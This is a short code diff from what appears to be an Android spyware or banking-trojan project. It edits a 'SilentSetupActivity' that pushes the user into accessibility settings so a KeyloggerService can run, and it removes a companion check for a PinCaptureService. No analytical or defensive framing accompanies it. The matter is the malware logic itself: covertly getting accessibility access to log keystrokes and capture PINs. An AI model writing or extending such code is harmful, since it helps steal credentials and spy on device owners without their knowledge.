@@ -171,14 +171,12 @@ class SilentSetupActivity : AppCompatActivity() {
     private fun requestAccessibility() {
         crashlytics.log("SilentSetupActivity: requestAccessibility")
         val keylogOk = isAccessibilityEnabled(KeyloggerService::class.java)
-        val pinOk    = isAccessibilityEnabled(PinCaptureService::class.java)
-        if (!keylogOk || !pinOk) {
+        if (!keylogOk) {
             try {
                 startActivityForResult(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS), 2005)
                 return
             } catch (e: Exception) {
                 crashlytics.recordException(e)
-                // Jika tidak bisa buka accessibility settings, langsung finish
             }
         }
         finishSetup()
